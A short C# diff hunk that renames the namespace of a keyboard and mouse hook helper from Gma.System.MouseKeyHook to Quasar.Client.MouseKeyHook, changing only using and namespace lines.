@@ -6,9 +6,9 @@ using System;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using Gma.System.MouseKeyHook.Implementation;
+using Quasar.Client.MouseKeyHook.Implementation;
 
-namespace Gma.System.MouseKeyHook.WinApi
+namespace Quasar.Client.MouseKeyHook.WinApi
 {
     internal static class HookHelper
     {
